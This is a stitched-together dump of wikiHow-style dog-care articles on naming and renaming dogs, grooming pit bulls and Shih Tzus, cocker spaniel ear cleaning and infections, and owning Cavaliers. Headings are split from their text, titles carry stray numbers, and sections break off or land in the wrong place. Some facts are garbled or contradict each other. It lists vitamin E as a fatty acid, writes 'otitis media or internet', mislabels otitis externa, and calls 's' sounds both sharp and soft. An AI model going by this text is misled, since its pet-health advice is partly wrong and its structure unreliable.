You can use a dictionary, like an English to Japanese dictionary, to find the exact translation of the names you are interested in. You can also use an online translator to translate the names for you. For example, you can put the name Mary into a translator and select a language you are interested in, like Russian. Now, Mary will become Marya or Maria.
You could honor your heritage or a country that you’ve visited by naming your dog in that language. For instance, if you had a great time on your trip to Denmark, you could name your dog Magnus or Freja.

, One way to make a more traditional or popular name more unique is to change the spelling. You could also consider taking a name that you like and spelling it backwards or adding an apostrophe.


A name like Heaven could become Nevaeh, or James become Semaj. Or, you could add apostrophes to names like Darcy to make them D'Arcy. It generally makes more sense to add apostrophes between syllables, but you can add an apostrophe wherever you'd like.

, This might seem obvious, but it’s a good way to eliminate more common names from your list. Don’t choose the same name for your dog as any of your friends, family members, or their pets. This way, your dog’s name will be unique and you won’t associate it with another person.You should avoid names of people that you see or who visit your home frequently. Alternatively, you could select an old family name since those people aren’t around anymore.

, The name that you give your dog will influence what other people think about your dog when they hear it. People think differently about a dog named “Killer” than a dog that’s named “Marshmallow.”You can also use a physical characteristic or personality trait to name your dog. For instance, a dog that barks a lot could become Barkley, or a shy pup could become Zalman, which means quiet in Hebrew.You could also play off of your dog’s personality and find an ironic or humorous name. For example, a quiet and laid back dog could become Riot or Rowdy.

, In order to pick a unique name, you’ll want to make sure it isn’t already a popular name for a dog. Search for lists of the most common dog names online and read them. Compare the lists to see whether any of your potential names are on that list.


You can eliminate names on your list of potentials based on your findings., While you may love a longer name, like Princess Worthington, it can be a mouthful. You can keep a long name as is, or you could consider shortening it to a nickname. Thus, Theophilus could become Theo for short. That way, you can still keep the full name that you like the best, and use a nickname when you need to shorten it.Plus, now your dog could have two unique names!


Many dog experts think that two syllable names, like Danny or Ziggy, are preferable to one syllable names like Jack or Jen. This is because most commands, like sit and stay, are one syllable and your dog might confuse the command with their name., This is going to be a name that you’ll use every day, whether you’re calling for your dog or talking about them. Practice saying each name on your list in a variety of different tones; yell it as though you’re angry, use a baby voice, say it in your normal tone of voice. Think about how the name sounds to you. Is it difficult to say or pronounce?You should enjoy saying the name and find it easy to say in different situations and with varying tones.

Stick with shorter names.,
Try out names sharp consonants.,
Do not pick a name that sounds similar to a command.,
Stick with similar sounds if you are renaming an older dog.,
Remember that you’ll be using your dog’s name in public.,
Ask before using a family member or friend's name.,
Try the name out for a couple of days before you make it permanent.,
Explore many names.",How to Name Your New Puppy or Dog1," Dogs have an easier time recognizing names that are either one or two syllables long, compared to names that are more complex. Instead of naming your dog something like Sir Merlin of Mangovia, you should shorten the name to Jake, or Meg.If you do want to give your pup a longer, more formal name, know that you will ultimately end up shortening it no matter what (it will just be easier to call for him to come that way) so go with a name that shortens into something cute.;
, Dogs hear high frequency sounds very well, so names starting with s, sh, ch, k, etc. work well when catching a dog's attention. Dogs will respond more quickly to these relatively sharp sounds. At the same time, consider names that end with a vowel, particularly a short ‘a’ or a long ‘e’ sound.Some example names that follow these rules include Simba, Kassie, Sweetie, Delilah or Charlie.

, Because dogs do not particularly recognize the actual word, but instead understand the frequency of the word, they can get confused by words that sound too similar--particularly when one of those words is a command that they are supposed to follow.


For example, the name ""Kit"" can easily be confused with the command ""sit"". The name “Bo” could be confused with “no”.

, Be careful when changing an older dog's name. Stick with similar sounds, such as changing ""Barney"" to ""Farley."" It's more important to keep the vowel sounds the same than the consonants, since vowels are easier for the dog to pick up on and what the dog is actually listening for. So ""Pinky"" will accept ""Mikey"" but not ""Porky."", Some names have a family meaning, but it may not go over well at the vet or dog park. Also, choosing a name that's too common will mean your dog might run to someone else (or you might get someone elses dog jumping on you).Names like “Fido” or “Rover” should probably be avoided, as they are some of the more traditional, and therefore more popular, dog names.
You should also consider the sort of reaction that the name you give your dog might inspire. For instance, people will probably be a little more wary of a dog named “Murder” than a dog named “Honey”.

, You may think it’s an honor to name your pup after your favorite Aunt Matilda, but she may not take it as a compliment. She might think of it as disrespect.

, Once you’ve chosen a new name, try it out for a day or so. See if it grows on you. You’ll know really soon whether it’s a keeper or not. If not, try something else. There are always many more puppy names to explore and try out. Don't forget to reward your puppy or dog when they respond to their new name. The more treats, love and hugs they receive now, the sooner they'll come running when you call later.


Pay attention to how it feels to say your pup’s potential name. Could you see yourself using that name over and over again? If your answer is no, you may want to consider choosing a different name.

, If you are really struggling on what you should name your dog, and need a little help being creative, you can always run an internet search for a list of cool dog names. There are quite a few websites that specialize in this topic and may help you to get your creative juices flowing.

Also, consider your dog's history. This can help you find a name that connects to him. Was he rescued from a bad situation? If so, think about finding a name that means ""lucky"" or ""fortunate."" The name Felix, for example, means ""fortunate"" so this might be a good choice for your dog., Many people enjoy finding names for their dogs based on their coat colors. Huskies are often black or gray, so a name that points to these colors can help. Something like Smokey, Foggy, or Ember could be great for a gray dog. Names like Ash, Ebony, or Velvet could be fun for a black dog., Remember, choosing a popular name can be confusing. Consider finding a more unique name for your husky. If a name you like feels too common, try altering it to make it more unique.


When it comes to color names, go beyond basics like Blackie or Gray. Consider looking up the names for different colors in another language. You could also pick weather conditions that point to a certain color. Dusk, for example, could be a fun and unique name for a black husky.If you want your dog to have a name connected to a famous husky, consider altering the name to make it more unique for your dog. If you're a fan of Balto, for example, keep in mind Kevin Bacon voiced Balto in the disney film. Bacon could be a fun, cute, and slightly quirky name for your dog.
Colors of your dog's eyes and nose can also help you think of a name. Is his nose so pink it's almost red? Call your dog Crimson.

Be reassured that changing your dog's name is fine.,
Select a name.,
Tell everyone in your household about the new name.,
Break out the treats.,
Take your dog to an area where you can keep his attention.,
Begin by saying the new name in a happy, excited voice.,
Say your dog's name when he is not focused on you.,
Stop giving your dog treats gradually.,
Be persistent.",How to Rename a Dog," While your dog will probably be confused at the beginning, dogs quickly learn new names.Additionally, many experts recommend changing the names of dogs who are known, or are suspected, to have been abused or dogs who have come from a very negative environment. This is because such trauma might have led the dog to associate his original name with punishment, abuse, and fear. In these situations, you are changing more than just the dog's name; you're also helping him recover and move forward from trauma.There's no reason to feel guilty about renaming a dog, just as long as the previous owner didn't specifically request that the name not be changed.;
, Once you've decided to change your dog's name, the next step will be deciding what the new one will be. For advice, read how to name your new puppy or dog. Here are some basic guidelines:


If you know what the dog's previous name was, consider choosing something similar to the original name to help your dog learn his new name more easily. For example, the names could rhyme or begin with the same sound.
Typically, it is easier for your dog to learn a shorter name, one that is 1-2 syllables long, such as Ruby, Bonnie, Billy, etc.Try to use 'hard' consonants or vowels, such as 'k,' 'd,' and 't'. These are easier for dogs to hear and distinguish from soft consonants, like 'f,', 's', or 'm.' For example, names like Katie, Deedee, and Tommy are names that most dogs will recognize and respond to more quickly than names like Fern or Shana.Avoid names that sound like commands commonly used for dogs, such as ""no,"" ""sit,"" ""stay,"" and ""come."" These can make it very difficult for your dog to know exactly what you want him to do.Avoid picking a name that sounds like the names of other family members or household pets. This too can result in confusion for your dog and slow his learning process.Avoid using temporary nicknames until you choose a proper name, as being called multiple names can confuse a dog and make renaming him more difficult.

, Before you begin re-training your dog, make sure everyone knows the name is being changed and is agreement about the new name. It can be very confusing for a dog if he is being called multiple names. By letting everyone know, the training process will be more consistent.

, Teaching a dog his new name is very much like teaching him anything else. Similarly to when training the command ""come"", your dog should learn to associate his new name with treats and attention as positive reinforcement. Give everyone in the household a few treats to keep in their pockets, and ask them to occasionally call the dog's new name and give him or her a treat.


Be sure to always say the dog's name in a positive tone of voice. Do not use your dog's name in an exasperated or upset voice or when scolding him and telling him ""no."" It's important that your dog learn to associate his new name with a positive experience, not punishment and unhappiness. Make sure each member of the household knows this.

, Try your own backyard or another quiet outdoor space where there are no other dogs to distract him. You could also begin the training process in your own home. You can have him either on or off of his leash.

, Then give him a treat accompanied by a lot of praise. Repeat this several times over the course of about 5 minutes. Your dog will quickly learn that his new name means he should focus on the caller.It's important that these training sessions be short because dogs have short attention spans and are easily bored.
Try to scatter several of these short sessions throughout the day. When outside of one of these sessions, you should say his name every time you talk to him. Also, you can occasionally say your dog's name when he is not focused on you, but don't overdo it. If he responds, be sure to give him a treat and a lot of praise.

, After several sessions where you say your dog's name when you have his attention, wait until he is not looking at you before saying his name. Again, say it in your happy and excited voice.If your dog is on a leash and does not turn to you when called, gently pull him to you while saying his name again and giving him a lot of praise and a treat. This will help him associate his name with a positive experience., Once your dog is consistently responding when you call his new name, it's time to slowly stop giving him treats. Start by only giving him a treat every other time he responds and comes when he hears his name. Then slowly reduce the treats until they are longer needed.

, While it might take your dog a while to learn his new name, if you use the name frequently and always in a happy tone, and consistently give your dog treats and praise, he will soon respond to his new name every time you say it!


Don't be tempted to use the dog's old name. Even if you just want your dog to pay attention, or you keep letting the dog's old name slip out, this will only confuse him. If you're still in contact with the dog's old owners (for example, if you were given the dog by other members of your extended family), ask them to use the dog's new name when around him.

Take your Pittie to the vet.,
Give your APBT the right nutrition.",How to Groom Your American Pit Bull Terrier3," Pit bulls are prone to certain skin conditions, like mange and allergies. Skin issues can seriously affect the condition of your dog’s coat, making it dry, dull, and/or flaky. Sometimes bathing and grooming can exacerbate these issues instead curing them. As you groom your dog, keep an eye out for visible irritations, like sores, scabs, rashes, or hot spots., If you notice symptoms of skin issues that are chronic, severe, and/or widespread, you should make an appointment with your veterinarian. Skin irritations could be a result of allergies or a symptom of more systemic issues like an immune or gastrointestinal disease. A vet can help you diagnose the causes of skin issues and prescribe treatments to address the underlying conditions.Vets can also help identify the causes of frequent itching. In general, if your Pittie itches all year round, it probably has a food allergy. If its itching tends to take place at a particular time of year, it likely has a seasonal allergy. If it’s constantly itching for short, intense periods, your APBT may well be extra-sensitive to fleas.

, You can help keep your Pittie’s coat and skin healthy by feeding it a diet that’s rich in essential fatty acids, such as vitamin E, omega-6, and omega-3. Check to see that your regular pet food contains these plant- and meat-based nutrients.Most high-quality “complete and balanced” dog kibbles will already contain essential fatty acids. If yours doesn’t, consider giving your Pittie a fish oil supplement to boost its omega-3 intake."

Choose a name based on the date.,
Choose a name inspired by a location.,
Choose a name by combining other names.,
Add a last name.",How to Choose an AKC Name for Dogs2," The kennel name is often a made-up word that has some meaning to the breeder, for example, a combination of family names, names of other beloved pets, or names of places they’ve been.

Protect your dog’s ear canal when bathing.",How to Clean a Cocker Spaniel's Ears," Cleaning your dog’s ears weekly can make it easier for you to spot an infection early and reduce the amount of wax in your dog’s ears. However, using the wrong type of ear cleaner can cause the skin to macerate (become soft and weak), which will actually increase your dog’s chances of getting an ear infection. Cleaning your dog’s ears also removes the natural waxes, which are there to condition the skin lining the ear canal. As a result, it may be harder for the ears to control infections, so cleaning your dog’s ears could make a problem more likely.

Consider how often your dog gets infections, and the type of cleaner you use.
Discuss your options with your vet to decide if cleaning your dog’s ears is a good idea.;
, If your dog has a head tilt, balance problems, or the ear seems very painful. This could be a sign of a ruptured eardrum and putting fluid into the ear could do permanent harm. If you notice any of these symptoms do not clean your dog’s ears and take them to see a veterinarian as soon as possible., There are many canine ear cleaners available online that you can buy without a prescription, but it’s best to check with your veterinarian before you administer anything to your dog. Ask your vet during a regular check-up—or during an appointment to treat a pre-existing ear infection—what treatment they would recommend. Some brands you can ask about include Malacetic Otic, Vet Solutions, and T-8 Keto.You can probably find any vet-recommended solution online for a more affordable price than offered at the veterinary office, but research the seller thoroughly before purchasing. Foreign companies often sell drugs and remedies containing expired or otherwise unsafe ingredients, so make sure you’re buying from a reputable, government regulated company.Important features to look for in any ear cleaner you buy include a pH that is sympathetic to the ear canal to prevent stinging or damaging the skin, ceruminolytic (gently dissolves wax), and evaporates readily to prevent excess cleaner left in the ear from coming into contact with skin and causing maceration.

, The entrance to a dog’s ear canal is a dark hole. This leads into a long L-shaped canal, which leads down to the ear drum. The canal has the capacity to hold several milliliters of fluid, so be generous when applying a cleaner as a few drops will be lost. Standing behind your dog while it rests in a sitting position, bend back the ear flap and look for the small hole underneath. This canal is where you will want to apply the solution.


You should perform this ritual every two weeks, and even more frequently if your dog has had a recent infection.
If your cocker spaniel is also receiving medicated drops to treat a bacterial or fungal infection, you should complete the cleaning at least thirty minutes before medicating.

, Once you’ve located the ear canal, you’ll need to pour the solution directly into it. Just be sure not to let the tip of the applicator bottle touch your dog’s ear canal. This can infect the lid of your cleanser and eventually make the problem even worse. Rather, use the ear flap as a kind of funnel and pour the solution down this funnel.Although it can seem difficult to make sure the cleaner goes all the way into the ear canal, never use a cotton ear bud or applicator tool! This can damage your dog’s ear bud or tamp problematic ear wax further down into the canal.

, A twenty- to thirty-second massage on the ear area will soften any wax or other buildup in the ear canal and help to deliver solution throughout. You’ll probably hear a soft, squishing noise, and your dog might squirm a bit.There might be a bit of discharge or excess solution on the inside of the ear flap or around the ear canal after massaging. Just wipe this away with a cotton ball or gauze, dabbing some mineral oil onto the cotton if necessary., The sensation of fluid dripping into their ear canals is uncomfortable to dogs, so you should let them shake their heads after cleanings.Just be wary if your dog shows signs of excessive scratching or irritation, as this can signal an infection.

, Otitis externa—an inflammation of the ear canal characterized by pain, scratching, and discharge—is a condition to which cocker spaniels are particularly susceptible and which can become a chronic, serious problem for your dog.


Otitis media and otitis externa are infections of the middle and inner ear canal, often resulting from the spread of otitis externa. In one study of cocker spaniels, it was shown that nearly 61% of cocker spaniels exhibiting signs of otitis externa were also suffering from otitis media or internet as well. These conditions are characterized by head shaking, dry or scaly skin, discharge, and redness., Now that you know what to look for, you should check your dog’s ears daily at the minimum for signs of irritation or infection. Lift up the ear flap and check for redness and discharge, and give your dog a good sniff to see if it’s exuding any unpleasant or musty odors.


You should also observe your dog’s day-to-day behavior. While some scratching is normal, any abnormal behavior—for example, whining, pawing at the ear, or guarding its ears from being touched—can signal discomfort., Excessive hair growth can impede air circulation to the ear canal, as well as make it more difficult to treat infections when they arise.Use a pair of small manicuring scissors and trim frequently in order to accustom your dog to the process.

, While many ear problems in cocker spaniels result from genetic narrow ear canals, ear infections and irritation can also be due to allergies.If your regular cleanings don’t seem to be helping prevent infection and you suspect that something else is going on, consult your veterinarian for an allergy diagnosis.


Foods such as lamb, eggs, fish, and corn are common culprits of allergic reactions, as well as topical solutions such as perfumes and household cleaning products., You’ll want to bathe your cocker spaniel every month or so, and it’s important to keep excess moisture out of its ears when doing so. This is because excess moisture can aggravate or even cause existing buildup and irritation in the ear canal. Stop this problem before it starts by blocking your dog’s ear canal with cotton balls before bathing.After bathing, complete your ordinary inter-ear cleaning ritual.

Watch for signs of your dog feeling bad.",How to Diagnose Ear Infections in Cocker Spaniels1," When your dog has an ear infection, she will be touching and favoring her ears more than usual. This includes scratching the ears with her paws and rubbing her ears along the floor., If your dog holds her head to one side, her ears may be sore. She may also shake her head a lot. Head tilting can be a sign of a deep infection, so it's important to get the ear checked immediately., Ear infections make your Cocker Spaniel’s ears sore, and because she is in pain, she may whimper or whine. Some dogs will whine while scratching their ears, which indicates their ear hurts., Bacterial infections often give off an unpleasant odor. Lift your Cocker Spaniel’s ears and sniff them. If one of them smells bad, or smells a little worse than usual, your dog may be developing an ear infection., One of the main symptoms for ear infections is discharge. The discharge will come from the ear canal and might be a thick, black or brown wax, a yellow-green substance, or even bloody., If the infection causes inflammation, the skin may be reddened. Excessive scratching may also cause inflammation. An infection may also cause swelling and greasiness.You may also see scabs or crustiness in the ear. Hair loss may also occur on the ear.
Compare one side with the other to get an idea if the skin is normal or thickened.

, Ear infections can be painful, thus making the dog feel bad. Your dog may not want to eat, either because she feels bad or because chewing hurts due to the ear pain. Your dog may seem depressed or lethargic, meaning she doesn’t want to do normal activities."

If you are looking for a guard dog, then the Cavalier is definitely not for you, as it is likely to welcome a thief with a lick and a waggy tail. Also, if you wish to go running or hiking with a Cavalier, they are likely to tire and you are better suited to a larger dog. However, if you need a dog that will play heartily and enjoys a good walk but without needing excessive amounts of exercise, then a Cavalier is a good choice.;
, Generally, the Cavalier is a small dog with a long coat. The Cavalier belongs to the toy group of dogs and weighs around 5.4 - 8.0 kg. They have a moderately long coat that is soft and silky.


The colors recognized by the US Kennel Club are Blenheim (chestnut markings on a white background), tricolor (black, tan and white), ruby (tan), and black and tan., In practical terms, when choosing a puppy find a breeder who can show that their dogs are free of disease both now and in previous generations. This can be tricky to do, as there is no certified system, but a responsible breeder will be able to prove their dogs have had regular vet checks and no problems were found at annual vaccinations.


Unfortunately there is currently no screening tests that are practical for breeders in order to ensure their breeding stock are clear of many problems common to Cavaliers. The only option for some diseases is for breeders to screen their breeding stock with an MRI scan, but this is costly and thus not normal practice.With regards to heart disease, the symptoms usually develop in middle age onwards, and so it can be difficult to guarantee a parent is free from heart disease early in its life (when it is likely to have pups)., Be aware how important socialization of the puppy is, when it comes to the Cavalier growing into a confident well-adjusted adult dog. The breeder should make efforts for as many different people as possible to meet the puppies from around 3 - 4 weeks of age, so the young dogs are used to people of different heights, appearances, and tones of voice.


The puppies should not be exclusively reared in a kennel, as this isolates them from the normal sights, sounds, and activities of a domestic house, and they will find it more difficult to adjust to family life.

, Even if a breeder claims the dog is healthy, have the dog tested for yourself. The Cavalier's only downside is its health. Unfortunately, the breed is over represented when it comes to serious health issues such as heart disease, syringomyelia, and Chiari-like malformation.Thus, a truly adorable family pet could die prematurely through heart disease, or suffer terrible pain during their lifetime from syringomyelia & Chiari-like malformation. The genetic problems associated with Cavaliers include:


Syringomyelia and Chiari like malformation: Fluid accumulates in and around the spinal cord, and the brain case is too small for the brain, putting it under pressure. Signs include yelping in pain, scratching at the neck, trying to catch imaginary flies, and depression.
Mitral valve disease: The heart valve in the left side of the heart fails to close properly, leading to an inefficient circulation. As heart disease leads to heart failure, the dogs may cough, become breathless, lack energy, be unable to exercise, and collapse.
Luxating patellas: This are wobbly kneecaps, which can move from side to side and cause the dog to hop on the affected leg.

, It is absolutely essential to avoid buying a puppy from a puppy farm. Not only because of the unethical way the puppies are bred and looked after, but because there is no control over the health of the parent dogs, so you are highly likely to be buying a pup brewing up health problems later in life.


Never, ever buy a puppy from a puppy mill. A cardinal sign of a puppy mill is the breeder makes an excuse as to why the mother dog is not available to view. This is because in reality the mother dogs is probably hundreds of miles away, waiting to be bred to produce yet more puppies. In the meantime, her litter are taken away far too young and transported large distances to places for sale. This trade is unethical and immoral, and should not be encouraged by buying these puppies and creating a demand.

, Your dog will need vaccinating against various canine infectious diseases. Exactly which diseases depends on which infections are prevalent in your area, so your veterinarian should advise you about which vaccinations are needed. The vet will select those diseases with are common in the area (core) and those less common (non-core) and discuss which are most appropriate for your dog.


The vaccinations your dog might get include distemper, parvovirus, canine adenovirus, leptospirosis, infectious canine hepatitis, parainfluenza virus and Lyme disease. In addition, a vaccination against rabies is obligatory in many states and you will be breaking the law not to comply.
Different vaccines are given at different ages. Typically the rabies vaccine is given as a single dose after 12 weeks of age, repeated every 1 to 3 years (depending on the manufacturer) or if given earlier (some brands can be given from 4 weeks of age,) a second dose must be given at or after 12 weeks of age.Other vaccinations are given in three doses 3 - 4 weeks apart, with the final dose always falling around 16 weeks of age.This is so the puppy receives protection from the vaccine at a young age, but not so early that it doesn't get the effect of antibodies derived from the mother. By 16 weeks of age, these maternal antibodies have waned and so once vaccinated the pup will be protected for approximately a year. At one-year-old the puppy will get the first booster injection. Your Cavalier should receive yearly booster injections according to the protocol advised by your vet.

, Deworming medications come in a wide variety of forms, including tablets, oral liquids or granules, and spot-on products. Each product has a slightly different spectrum of activity, so your vet is the best resource to discuss what's best for your pet. A basic worming regime is against roundworms (monthly) with a quarterly broad spectrum wormer against whipworms and tapeworms.


Treatment against heartworm is also advisable, either as a six-monthly injection, or a monthly spot-on treatment at home.
Fleas are unpleasant and can cause skin allergies and infections if left untreated. If your Cavalier spends a lot of time outdoors, another common parasite you should have it treated for are ticks, which also carry unpleasant diseases such as Lyme's disease or tick borne fever. Prevention is better than cure, so this involves using a product effective against fleas and ticks, such as fipronil (Frontline or Effipro) or the Seresto collar.

, Neutering or spaying should be discussed with your veterinarian. It is usual to operate on females from 4 - 6 months of age, and males around 6 -10 months of age, however, this varies depending on the individual vet clinic. The obvious advantage of neutering is that it prevents unscheduled breeding. It can also protect the female dog against mammary cancer, if surgery if performed before the bitch's second heat.


If your Cavalier does develop health problems, such as syringomyelia or a heart murmur, then you must absolutely not breed from the dog. Breeding a dog with hereditary diseases risks passing the problem down to future generations.

, Dogs should not be fed too much grain or filler. Look at the label on the food container and make sure a named meat is the first and second ingredient on the bag.


If you are unsure what food to feed your dog, consult with your veterinarian for suggestions.
When you adopt a dog or puppy you should transition it off of the food it has been eating if you want to change its diet. Find out what it has been eating, buy a small supply of that food, and then gradually mix in the new food you want to feed it. This transition should take over a week before you are only feeding the new food.

, Use the amount recommended on the package as a starting point, but regularly weigh your Cavalier to make sure they are not gaining too much weight. Some Cavaliers can be quite greedy, so be aware you can't use how hungry they appear as a gauge of how much to feed them.


Be aware that your dog may be prone to beg for food and treats. Use treats sparingly, as they can add a lot of calories to your dog's diet if given in excess.

, Wait for at least 90 minutes after feeding before exercise. If you exercise a dog too soon after feeding there is a risk of the dog's stomach flipping over and becoming twisted, which is a life-threatening condition called bloat., You should never limit your dog's access to water or leave only dirty water out for your dog. Dehydration can occur quickly, especially in warm weather.

, Take care of your dog's teeth by getting into the habit of regular tooth brushing. Use a special dog toothbrush or a finger mitt. Wet the brush with water and gently rub it on the outer surfaces of the teeth. Once the dog is happy with this you can introduce a blob of dog toothpaste onto the brush.


These pastes are tasty to dogs, don't need rinsing, and are free from substances harmful to dogs if swallowed, such as fluoride.

, Comb the dog through daily, and brush out at least once a week.Cavaliers have a soft, silky coat that can become knotted, especially when the dog is outdoors and gets leaves tangled in its fur. Regular brushing will keep the tangles under control, so they don't become matted.


It's best check your dog over after each walk. Look for grass awns or burrs that may be lodged in fur around the ears or paws, in addition tangles and debris.

, Become familiar with your dog's body so you have a good idea of what a healthy body shape is for it. A dog in good body condition should have a waist line when viewed from above or the side, and you should be able to feel its ribs easily, but without the ribs standing out through the skin.


If you inspect your dog's body regularly, for example when you brush it, then you will be able to spot changes more easily.

, Cavaliers are gentle good-natured dogs, but, as with all canines, they enjoy the sense of security associated a capable owner who demonstrates they are in charge. Training sessions should be reward-based and clicker training lends itself ideally to this.


The principle behind clicker training is that the dog associates the click-clack of the clicker with a reward. When the dog shows a desired behavior (such as ""sit"") the click-clack marks the exact moment being rewarded, which helps the dog understand what behavior earns a reward. Then a cue word ""Sit"" is added to the click-clack, and eventually the clicker noise dropped in favor of the command.
Good basic commands to teach are Sit, Stay, and Come. This equips you with good control of the dog because you can stop them and recall them to you, whatever the circumstances, hence keeping the dog safe.

, Your Cavalier will love the one-to-one time with you, so training generally strengthens the bond between you. Try to schedule two, 10 - 15 minutes sessions a day.

, Cuddle it, snuggle it, and pet it every day. What a Cavalier wants most from life is to be loved and adored. Make sure you don't disappoint your dog by ignoring it. The love you give you will get back ten fold from your Cavalier.

They are especially good around children, as long as you make sure the children do not frighten or injure the dog while playing.;
, This is especially important when introducing them to new pets. Have your cocker and other pets around each other a little at a time first. In general, though, cocker spaniels also get along well with other pets.

, Let them get used to their new home before bringing them to meet new people. Keep them close to the house, even during walks, before straying too far from home.

, Even short walks or playing outside for a few minutes can be good for them. Try to bring them for a brisk walk for about 30 minutes twice a day. This should be enough exercise for your cocker.Cockers also like going to the park to play. You can always bring them to the park on the weekends when you may have more time. Bring a leash that gives them plenty of room to roam, but where you can also keep them under control.
Cocker spaniels are very playful. Try games like hide and seek and fetch to keep your dog active."

Most of the items can be easily found at your local pet store or grocery store. You will also need some other items that you probably have lying around the house, like towels and a hairdryer.You will need to purchase a dog brush, preferably a curry brush with rubber teeth that will be gentle, but effective, on your dog’s coat.
You should also get some dog nail trimmers and some electric hair clippers (made for use on dogs).
Purchase some shampoo that is specially formulated for use on dogs. Human shampoo can be irritating to your dog’s skin, so never use it on your dog. You can purchase varieties of dog shampoo that specialize in sensitive skin or certain types of dog hair. There are also formulas made just for puppies.;
, To groom your dog safely at home, you’ll need to find an area that they can’t escape from. If you want to do the grooming outside to minimize the mess, make sure it’s in an enclosed space like a garage or a fenced-in yard. If you want to groom your dog inside, consider using your bathroom so you can close the door to keep the dog in. You’ll also have easy access to water in the bathroom for when you bathe your Shih Tzu.Put some towels down on the floor to keep you and your dog from slipping and to minimize the mess.
Additionally, be sure to put down a nonslip surface in the sink or bathtub to protect your pup from slipping and hurting itself.
Only groom your dog outside if the weather permits. Weather that is too hot or too cold could make your dog uncomfortable.

, Grooming can be stressful for dogs, especially the first few times they experience the process. Before you begin grooming your dog, take a few moments to soothe it and calm it down so that it feels safe and comfortable.Try petting your Shih Tzu in your lap and praising it in soothing tones. This will help calm your dog down and put it in the right mood for grooming.

, Place the brush directly, but softly, on the skin and comb through until you reach the end of the hair. Gently brush your dog’s face, especially its muzzle, as food tends to get stuck in this when it eats. Then rub the brush down its legs softly, again moving from the base of the hair to the tips.Brushing your Shih Tzu regularly is one of the best ways to keep grooming maintenance needs to a minimum. Regular brushing can help keep tangles and mats from developing into bigger problems.
You should feel free to brush your Shih Tzu every day, but try to do it at least two or three times a week at a minimum.

, To get rid of tangles and mats, you’ll need to work through them gently. Start at the bottom (the tips of the matted hair) and use the brush to gently work out the tangles a little bit at a time. Work on little pieces at a time and keep unraveling the hair as you make your way up to the base.


But remember that the best way to deal with tangles is to do preventative care that ensures they never develop in the first place.

, Bathing your Shih Tzu will help your dog smell fresh and prevent unwanted bits of matted fur. To begin the bathing process, you’ll need to get your dog’s coat wet. Use mildly warm water to soak your dog’s coat until it is wet all over.Ensure the water is lukewarm. If it is too cold, this can be dangerous for your dog’s body temperature. Additionally, water that is too hot can cause your dog to get burned which is also dangerous.
Be sure to place your dog on a nonslip surface in the tub to prevent your dog from slipping.

, Get a dog friendly shampoo and gently massage it into your dog's fur, making sure to stay clear of its eyes. Once the shampoo has been rubbed into a lather, use a small bowl or cup to pour water over the dog’s fur. At the same time, rub your hand on the dog’s body to help rinse the shampoo out.Be sure to rinse out all of the shampoo residue, as any left behind could cause serious irritation to your dog’s skin.

, While your dog’s fur is still wet, rub around your Shih Tzu’s eyes with clean water to get rid of the rheum (mucus). You can use your fingers, if they are clean, or a soft cloth to remove the mucus. Be gentle and careful not to poke your dog in the eyes. You can also use a hairbrush (or a small pair of scissors, depending on the intensity of the mat) to get rid of any bits of matted fur.If you leave the rheum on your Shih Tzu’s eyes for too long, it can discolor the hair around your dog’s eyes. This is especially true if your dog has lighter colored hair.

, Take your Shih Tzu out the bath or sink and wrap it in a towel. Rub the dog to get it warm and to absorb some of the excess water. You can either let your dog air dry at this point or you can use a hairdryer on the dog to fully dry your pup’s coat.Be sure to use the lowest setting on the hairdryer when drying your dog. If you use a warmer setting, it could burn your dog’s skin.
Sometimes dogs are afraid of the noise that the hairdryer makes. Try introducing the dog to the noise slowly at first before you start using it on the dog.

, Once your Shih Tzu is warmer and its fur is just about dry, take a soft brush and gently comb its fur down its back. Focus on any matted fur that wasn't taken care of earlier when you brushed the dog before its bath. This will help remove any additional tangles, or any tangles that happened during the bathing process.Again, be sure to start at the base of the hair and gently comb all the way out to the tips. This is the best way to remove tangles.

, Hold the nail clippers in the palm of your hand and use your fingers to make the cut. Insert your dog’s nail into the hole in the clippers and make a swift, clean cut. This will help reduce fraying on the dog’s nails.Be sure to only cut the white part of the nail. The pink part contains the quick, which is live tissue, and it will bleed if you cut it.
If you accidentally make your dog’s nails bleed, put some cornstarch on it to help it stop bleeding.

, Using a Number 10 blade electric hair clipper, trim your Shih Tzu’s hair. The Number 10 is long enough to avoid cutting your dog’s skin. Most Shih Tzu haircuts involve trimming the beard and ear hair on the face and then shaving the remainder of the dog’s body to the desired length. Use the trimmer to get the dog’s hair as short as you want it.Be especially careful when trimming around the dog’s face. You don’t want to accidentally poke the dog in the eyes.
You should secure your dog in place (using a leash) during this part of the process to make sure it can’t try to escape and jerk away.

, Use some cleaning solution that is intended for use on dog ears. This kind of product can be purchased at any pet store. Pour a few drops of the solution on a cotton ball and gently rub it on the skin and hair around the dog’s ears. Then fold the dog’s ear back over and massage the ear from the top side to get the cleaning solution all over the surface. Then use a clean cotton ball to wipe up any remaining moisture from the cleaner.At this point, you can take a fine comb (preferably the one you used to comb the dog’s face) and gently comb the hair in and around the dog’s ears. This will also help prevent any mats from forming.
When using the cotton balls, make sure you don’t get them too deep into the dog’s ear cavity.
To clean your Shih Tsu’s ears, it is easiest to place the dog on its side on a flat surface.

, Use a double-sided toothbrush and toothpaste that is made for dogs. These items can be purchased at any pet store. Gently slide the toothbrush around your dog’s mouth and try to scrub (again, gently) its teeth and gums. Start slowly and work your way up to longer sessions while your dog gets used to the new process.If your dog has trouble adjusting to the toothbrush, you can purchase a finger brush that slides onto your finger to use in the beginning. This will help your dog get used to the process before you transition to a real dog toothbrush.
Again, be sure to purchase toothpaste that is intended for use with dogs. Human toothpaste contains ingredients that can be toxic if ingested by dogs.

Check your dog’s ears regularly.,
Take your dog to the vet.,
Get the proper treatment for your dog.",How to Diagnose Ear Infections in Cocker Spaniels2," Since you own a Cocker Spaniel, you should check her ear flaps at least once a day so you can pick out debris, such as twigs or grass seeds, that has become entangled in the long fur. Regularly check the ear for infection. To do this, lift the ear flap and check for skin redness, excessive wax, or discharge from the ear. Sniff each ear to see if they smell bad, which could indicate an infection.If you have doubt about whether your dog’s ear looks normal or not, compare one ear with the other. Often ear one side is worse than the other when there is an infection.

, If you think your Cocker Spaniel has an ear infection, take her to the vet immediately. The vet will perform a physical examination, looking to see if the dog has a head tilt, if there is pain around the ear, if there is a discharge, or physical changes in the ear. The vet will inspect the ear canal for inflammation, redness, ulcers, discharge, or foreign bodies in the ear, such as a grass awn.The vet uses an otoscope to look down the external ear canal. The otoscope fits down the ear canal and allows the vet to look deep into the ear for infections.
If a discharge is present and the ear is sore, this is enough to diagnose an ear infection.

